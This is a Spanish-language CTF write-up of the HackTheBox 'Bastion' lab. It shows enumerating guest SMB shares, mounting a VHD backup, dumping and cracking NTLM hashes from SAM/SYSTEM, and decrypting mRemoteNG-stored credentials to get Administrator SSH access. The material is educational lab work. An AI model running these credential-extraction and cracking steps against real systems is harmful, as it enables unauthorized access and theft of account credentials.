---
layout      : post
title       : "HackTheBox - Bastion"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png
category    : [ htb ]
tags        : [ mRemoteNG, VHD, backup, cracking, mount, registry-files, SMB ]
---
Máquina **Windows** nivel fácil. Nos moveremos con *Samba*, jugaremos con el backup de una máquina virtual **Windows** para extraer los archivos **SAM** y **SYSTEM**... Crackearemos cosillas y nos daremos cuenta que un software guarda contraseñas de acceso al sistema, ¿qué procede? e.e

![186bastionHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186bastionHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [L4mpje](https://www.hackthebox.eu/profile/29267).

ARAGANEEEEEEEEEEEEEEEZ! A jugar.

Nos enfrentaremos a carpetas compartidas mediante **SMB**, una de ellas tendrá un *Backup* de una máquina virtual **Windows**, jugando con algunas herramientas y archivos (**SAM** y **SYSTEM**) obtendremos los hashes **NTLM** de los usuarios **Administrator**, **L4mpje** y **Guest**. Jugaremos con *cracking* para obtener la contraseña en texto plano del usuario **L4mpje**, conseguiremos una sesión mediante **SSH** como él en el sistema.

Enumerando la máquina veremos que existe un programa llamado **mRemoteNG** (que se encarga entre otras cosas de proveer conexión entre protocolos (RDP, SSH, telnet, etc...)), en la web nos indican que ese servicio guarda las credenciales que se han usado para conectarse a otros protocolos (dichos antes, como **SSH**), encontraremos que se guardan en un objeto llamado `confCons.xml`, dentro están las credenciales encriptadas, usando [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) conseguiremos desencriptarlas y obtener la contraseña en texto plano usada por el usuario **Administrator** para conectarse al sistema... ¿Qué harías?

A darle.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

BUAAAJAJAAAAAaaaaaa, a rompernos!!

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Como nunca hemos hecho, vamos a empezar por un escaneo de puertos mediante **nmap**, así vemos por donde empezar a jugar:

```bash
❱ nmap -p- --open -v 10.10.10.134 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Nos responde:

```bash
# Nmap 7.80 scan initiated Wed Jun  2 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.134
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.134 ()   Status: Up
Host: 10.10.10.134 ()   Ports: 22/open/tcp//ssh///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 5985/open/tcp//wsman///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
# Nmap done at Wed Jun  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 76.08 seconds
```

Por lo tanto, tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 22          | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)** |
| 135         | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)** |
| 139         | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 445         | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 5985, 47001 | **[WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management)** |
| 49664, 49665, 49666, 49667, 49668, 49669, 49670 | Desconocidos |

Ahora hacemos un escaneo más profundo con base en los puertos encontrados, así podemos investigar sobre que servicio es cada puerto, posiblemente su software y si tiene scripts de *nmap* relacionados:

**~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes**
 
```bash
❱ extractPorts initScan 

[*] Extracting information...

    [*] IP Address: 10.10.10.134
    [*] Open ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV 10.10.10.134 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

La respuesta es:

```bash
# Nmap 7.80 scan initiated Wed Jun  2 25:25:25 2021 as: nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN portScan 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -28m59s, deviation: 1h09m15s, median: 10m58s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-02T18:56:49+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-02T16:56:51
|_  start_date: 2021-06-02T16:33:48

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74.97 seconds
```

Cositas interesantes tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH for_Windows_7.9 |
| 445    | SMB      | Windows Server 2016 Standard 14393 |
| 5985, 47001 | WinRM | Microsoft HTTPAPI httpd 2.0 |

Un sistema operativo del servidor *Samba*, pero poco podemos hacer desde ya, así que empecemos a ver por donde entrar :s

...

### Puertos 139-445 SAMBA [⌖](#puertos-smb) {#puertos-smb}

[SAMBA](https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/) en términos generales permite a nodos de una red compartir información (: Corto y sencillo e.e

Podemos jugar con la herramienta [smbmap](https://www.hackplayers.com/2015/05/smbmap-busca-carpetas-windows-desde-kali.html) para ver si existen recursos compartidos en la red, como no tenemos usuarios aún, probamos con una sesión nula:

```bash
❱ smbmap -H 10.10.10.134 -u '' -p '' 
[!] Authentication error on 10.10.10.134
```

Pero jugando:

```bash
❱ smbmap -H 10.10.10.134 -u '' -p ' '
[+] Guest session       IP: 10.10.10.134:445    Name: unknown                                           
[-] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\WGLCGDJOHA, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

***(También funciona así:***

```bash
❱ smbmap -H 10.10.10.134 -u 'null' -p 'null'
```

***)***

Bien, vemos 4 recursos, pero solo tenemos acceso de lectura a 2 de ellos: `Backups` y `IPC$`, para ver el contenido de esos directorios nos apoyamos de la herramienta [smbclient](https://jcsis.wordpress.com/2011/08/26/acceder-a-recurso-compartido-desde-un-terminal-linux-con-smbclient/), empecemos por `Backups`:

```bash
❱ smbclient //10.10.10.134/Backups -U ''
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 16 05:02:11 2019
  ..                                  D        0  Tue Apr 16 05:02:11 2019
  note.txt                           AR      116  Tue Apr 16 05:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2752055 blocks available
smb: \> 
```

Opa, vemos algunos archivos y un directorio, para trabajar cómodos vamos a descargarnos todo el directorio **Backups** a nuestro sistema, lo podemos hacer también con **smbclient**:

```bash
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \note.txt of size 116 as note.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
getting file \SDT65CB.tmp of size 0 as SDT65CB.tmp (0,0 KiloBytes/sec) (average 0,2 KiloBytes/sec)
getting file \WindowsImageBackup\L4mpje-PC\MediaId of size 16 as WindowsImageBackup/L4mpje-PC/MediaId (0,0 KiloBytes/sec) (average 0,1 KiloBytes/sec)
```

Pero se queda ahí un rato, para ver el tamaño de lo que estamos descargando podemos usar [smbget](https://www.linuxito.com/gnu-linux/nivel-medio/1315-descargar-archivos-desde-un-servidor-samba-con-smbget) que también nos permite descargar directorios compartidos mediante *samba*:

```bash
❱ smbget -R smb://10.10.10.134/Backups -U ''
Password for [] connecting to //Backups/10.10.10.134: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.134/Backups/note.txt
smb://10.10.10.134/Backups/SDT65CB.tmp
smb://10.10.10.134/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
[WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd] 2,50MB of 5,05GB ...
```

Pues con razón u.u **5.05** gigas se me descarga en 3 días (:

Lo mejor en este caso, es hacer una [montura de la carpeta compartida](https://linuxize.com/post/how-to-mount-cifs-windows-share-on-linux/), así no tenemos que descargar nada (actualicen **cifs-utils**, me daba problemas y actualizándolo se solucionó):

```bash
❱ mkdir /mnt/Backups
❱ mount -t cifs -o username=' ' //10.10.10.134/Backups /mnt/Backups
Password for  @//10.10.10.134/Backups: 
```

Y obtenemos:

```bash
❱ tree /mnt/Backups/
/mnt/Backups/
├── note.txt
├── SDT65CB.tmp
└── WindowsImageBackup
    └── L4mpje-PC
        ├── Backup 2019-02-22 124351
        │   ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
        │   ├── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
        │   ├── BackupSpecs.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
        │   └── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
        ├── Catalog
        │   ├── BackupGlobalCatalog
        │   └── GlobalCatalog
        ├── MediaId
        └── SPPMetadataCache
            └── {cd113385-65ff-4ea2-8ced-5630f6feca8f}

5 directories, 19 files
```

Listones, varios archivos a enumerar :P

Una nota:

```bash
❱ cat note.txt 
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Del resto de archivos solo tenemos dos llamativos:

```bash
❱ file *
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd:                                                     Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:00 2019, 104970240 bytes, CHS 1005/12/17, State 0x1
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd:                                                     Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:01 2019, 15999492096 bytes, CHS 31001/16/63, State 0x1
BackupSpecs.xml:                                                                              data
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml: data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml:                                          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml:                                    data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml:          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml:          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml:          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml:          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml:          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml:          data
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml:          data
```

Intentando con **strings** o **cat** ante los `.xml` no logramos ver nada...

Buscando en internet y guiándonos por la descripción de los archivos, vemos que un objeto `.vhd` es usado para almacenar backups de discos duros virtuales (máquinas virtuales).

> May include disk partitions, a file system, files, and folders. [VHD extension](https://fileinfo.com/extension/vhd).

Bien, dando algunos pasos por ahí encontramos este recurso:

* [How to mount VHD files](https://infinitelogins.com/2020/12/11/how-to-mount-extract-password-hashes-vhd-files/).

Siguiéndolo podemos aprovechar la máquina virtual (backup) que conseguimos para montarla y ver que hay, esto lo logramos con la herramienta **guestmount**:

```bash
❱ mkdir /mnt/vhd
❱ guestmount --add "/mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro -v /mnt/vhd/     
...
```

Yyyyy:

```bash
❱ pwd
/mnt/vhd
❱ ls -lh
total 2,0G
drwxrwxrwx 1 root root    0 feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root   24 jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root   10 jun 10  2009  config.sys
lrwxrwxrwx 2 root root   14 jul 13  2009 'Documents and Settings' -> /sysroot/Users   
-rwxrwxrwx 1 root root 2,0G feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root    0 jul 13  2009  PerfLogs
drwxrwxrwx 1 root root 4,0K abr 11  2011 'Program Files'
drwxrwxrwx 1 root root 4,0K jul 13  2009  ProgramData
drwxrwxrwx 1 root root    0 feb 22  2019  Recovery
drwxrwxrwx 1 root root 4,0K feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root 4,0K feb 22  2019  Users
drwxrwxrwx 1 root root  16K feb 22  2019  Windows
```

Perfecto, tenemos el contenido de la máquina virtual, ahora nos queda recorrer directorios importantes y ver con que podemos jugar...

...

## Explotación [#](#explotacion) {#explotacion}

Peeero antes de enloquecernos con tanto archivo, vamos a la fija, ya que es un *backup* de todo el sistema, debemos tener acceso a los archivos **SAM** y **SYSTEM**, ya que entre los dos tienen las passwords de los usuarios en formato hash [NTLM](https://www.ionos.es/digitalguide/servidores/know-how/ntlm/).

* [What is **Security Accounts Manager (SAM)**](https://www.top-password.com/blog/tag/windows-sam-registry-file/).
* [Registros en *Windows*](https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users).

Por lo general están en la ruta `Windows/System32/config`:

```bash
❱ pwd
/mnt/vhd/Windows/System32/config
❱ ls -lh
total 73M
...
-rwxrwxrwx 1 root root 256K feb 22  2019 SAM
...
-rwxrwxrwx 1 root root 9,3M feb 22  2019 SYSTEM   
...
```

Y si (: 

Ahora, juntando los archivos con la herramienta [samdump2](http://www.reydes.com/d/?q=Recuperar_la_Contrasena_del_Administrador_utilizando_samdump2_y_John_The_Ripper) podemos obtener los hashes de cada usuario, posteriormente podemos intentar [PassTheHash](https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack) o crackearlos:

```bash
❱ samdump2 SYSTEM SAM 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::   
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

Tres usuarios y dos de ellos dicen *disabled* (ni idea que significara en el contexto), tomemos la última parte de los hashes (que si nos fijamos, es la única parte que es dinámica) y guardémosla en un archivo:

```bash
❱ cat ntlm.hashes 
Administrator:31d6cfe0d16ae931b73c59d7e0c089c0   
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
L4mpje:26112010952d963c8dc4217daec986d9
```

Bien...

Estuve probando con **evil-winrm**, **psexec**, **wmiexec** y **crackmapexec** con los hashes para hacer *PassTheHash*, pero no tuve éxito, así que solo nos queda intentar crackearlos, usando [John The Ripper](https://www.redeszone.net/seguridad-informatica/john-the-ripper-crackear-contrasenas/) logramos esto, debemos pasarle unos parámetros:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ntlm.hashes
```

* `--wordlist`: El archivo con el que queremos que itere cada hash en busca de similitudes.
* `--format`: El formato en el que están los hashes, en nuestro caso **NTLM** (o **NT** para *john*).

Tenemos:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ntlm.hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
bureaulampje     (L4mpje)
2g 0:00:00:02 DONE (2021-06-03 00:30) 0.8849g/s 4157Kp/s 4157Kc/s 4159KC/s burg772v..burdy1   
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

```bash
❱ john --show --format=NT ntlm.hashes 
Administrator:
Guest:
L4mpje:bureaulampje

3 password hashes cracked, 0 left
```

De los 3 usuarios encontró el resultado del hash de **L4mpje**, el cual da como contraseña a **bureaulampje** ✨

Despues de algo de tiempo muerto jugando con las herramientas que use para el *PassTheHash* no conseguí hacer funcionar las credenciales, pero con **crackmapexec** pude confirmar que si son válidas:

```bash
❱ crackmapexec smb 10.10.10.134 -u 'L4mpje' -p 'pwincorrecta?'
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [-] Bastion\L4mpje:pwincorrecta? STATUS_LOGON_FAILURE
```

```bash
❱ crackmapexec smb 10.10.10.134 -u 'L4mpje' -p 'bureaulampje'
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\L4mpje:bureaulampje
```

¿Se ve la diferencia? e.e

Al no saber donde más probar las credenciales, echamos un ojo al escaneo de **nmap** que hicimos y pues sí, había algo que no habíamos probado, el puerto **22** (SSH), validemos si por ahí las credenciales nos permiten entrar: (Pues como casi nunca está en una máquina **Windows** pues ni me acordaba de él :P)

```bash
❱ ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password: 
```

![186bash_ssh_lampjeSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186bash_ssh_lampjeSH.png)

BOOOM! Tamos dentro del sistema como el usuario **L4mpje** :o

...

Acá ya podemos borrar las monturas, ya que no nos van a ser de utilidad (espero que no :P)

```bash
❱ umount /mnt/vhd
❱ umount /mnt/Backups
```

Sigamos.

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Despues de un rato profundizando, encontramos un rabbit hole en el directorio `C:\Logs` (que suena llamativo, pero no hay nada útil 🙃)...

Peeeero, finalmente encontramos algo llamativo y distinto:

```powershell
PS C:\Program Files (x86)> dir

    Directory: C:\Program Files (x86)

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        16-7-2016     15:23                Common Files
d-----        23-2-2019     09:38                Internet Explorer
d-----        16-7-2016     15:23                Microsoft.NET
da----        22-2-2019     14:01                mRemoteNG
d-----        23-2-2019     10:22                Windows Defender
d-----        23-2-2019     09:38                Windows Mail
d-----        23-2-2019     10:22                Windows Media Player
d-----        16-7-2016     15:23                Windows Multimedia Platform   
d-----        16-7-2016     15:23                Windows NT
d-----        23-2-2019     10:22                Windows Photo Viewer
d-----        16-7-2016     15:23                Windows Portable Devices
d-----        16-7-2016     15:23                WindowsPowerShell

PS C:\Program Files (x86)>
```

Ven algo raro? ¯\_(ツ)_/¯

Pues sí, hay un programa llamado **mRemoteNG** que normalmente no viene en los sistemas **Windows**, esto nos da un punto de partida para al menos ver de que se trata:

> Este programa te permite administrar, en un mismo programa y con una interfaz muy sencilla y amigable, múltiples conexiones con diferentes protocolos. [¿mRemoteNG?](https://www.smythsys.es/10961/mremoteng-administrador-de-conexiones-de-codigo-abierto/).

Tales como:

> RDP, VNC, SSH, Telnet, rlogin and other protocols. [mremoteng store passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote/).

Y si, como se ve en la referencia anterior, encontramos una vulnerabilidad para ese servicio 🤭, ya que administra varios conexiones entre protocolos, pero guarda las credenciales que se usan para esas conexiones ⚠️

> It saves the passwords in an encrypted format. [mremoteng store passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote/).

Investigando **donde** las guarda, encontramos el módulo de **metasploit** al que se hace referencia y dentro el archivo con el que juega para extraer las credenciales:

* [metasploit-framework/mremote.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/mremote.rb).

![186google_mremoteNG_rb](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186google_mremoteNG_rb.png)

Tenemos dos rutas para probar y buscar el archivo llamado `confCons.xml` o hacer una [búsqueda recursiva](https://stackoverflow.com/questions/8677628/recursive-file-search-using-powershell) sobre todo el directorio `C:\Users` y ver si encuentra el objeto, hagamos esa opción:

```powershell
PS C:\Program Files (x86)> Get-Childitem -Path C:\Users\ -Filter confCons.xml -recurse -ErrorAction SilentlyContinue -Force  

    Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        22-2-2019     14:03           6316 confCons.xml

PS C:\Program Files (x86)>
```

Le indicamos que busque en el directorio `C:\Users` y que filtre por un archivo llamado `confCons.xml`, que lo haga recursivamente (en todos los directorios) y fuerce a buscar archivos ocultos yyyy que si encuentra algún error lo salte y siga buscando.

Y lo encontramos 🔥 lo tenemos en la ruta:

```powershell
C:\Users\L4mpje\AppData\Roaming\mRemoteNG
```

Veamos si es cierto 😬

```powershell
PS C:\Program Files (x86)> ls C:\Users\L4mpje\AppData\Roaming\mRemoteNG

    Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
...
-a----        22-2-2019     14:03           6316 confCons.xml
...

PS C:\Program Files (x86)>
```

Y si, pues viendo su contenido encontramos las contraseñas de las que se hablaban:

```powershell
PS C:\Program Files (x86)> type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
```

Vemos unas credenciales del usuario **Administrator**:

![186win_confConsXML_1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186win_confConsXML_1.png)

Y otras del usuario **L4mpje**:

![186win_confConsXML_2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186win_confConsXML_2.png)

Pero, están encriptadas, como las desencriptamos ❓

Con una simple búsqueda de `decrypt mremoteng` en la web, obtenemos este recurso que se encarga de esa tarea:

* [https://github.com/haseebT/mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt).

Lo clonamos y simplemente debemos pasarle la contraseña encriptada, probemos con la del usuario **Administrator** primero y despues con la de **L4mpje**:

```bash
❱ python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="   
Password: thXLHM96BeKL0ER2
```

```bash
❱ python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s "yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"   
Password: bureaulampje
```

(Es la misma con la que ingresamos por medio de **SSH**).

Perfecto, pues probemos esa contraseña del usuario **Administrator** contra el servicio **SSH**:

```bash
❱ ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password:   
```

Colocamos la contraseña y obtenemos:

![186bash_ssh_adminSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186bash_ssh_adminSH.png)

LISSSSSSSSSSTO, tamos dentroooooooooooo 🚀

Veamos las flags...

![186flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186flags.png)

...

Bonita máquina, bastante juguetona y de enumerar bien, me gusto el tema de las monturas y el tener que jugar con un backup de una máquina virtual, lindo eso...

Bueno bueno, hasta acá hemos llegado, y que el camino los guie hacia la guía del camino :P COMO SIEMPRE!! A romper todo!